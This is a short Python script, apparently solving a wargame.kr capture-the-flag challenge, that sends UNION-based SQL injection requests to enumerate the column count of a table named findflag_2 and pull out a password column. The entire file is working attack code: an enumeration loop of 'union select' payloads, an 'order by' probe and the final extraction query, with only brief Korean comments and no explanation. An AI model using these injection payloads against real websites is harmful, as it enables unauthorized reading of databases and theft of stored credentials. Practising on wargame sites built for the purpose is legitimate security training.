from requests import *
#findflag_2 테이블 속성 갯수 및 id 속성의 순서
'''
url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1'
for i in range(1,10):
    if i != 1:
        url+=f',{i}'
    url2=url+'%23'
    response=get(url=url2)
    if response.text.find('Hello') != -1:
        print('findflag_2의 속성 갯수:',i)
        print(response.text)

#id
url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' or 1 order by 5 %23'
response=get(url=url)
print(response.text)
'''
#pw column name
url='http://wargame.kr:8080/zairo?pw=,3,4,5 %23&flag=abs&id=\' union select 1,'
response=get(url=url)
print(response.text)
#pw
url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1,xvvcPw4coaa1sslfe,3,4,5 from findflag_2 %23'
response=get(url=url)
print(response.text)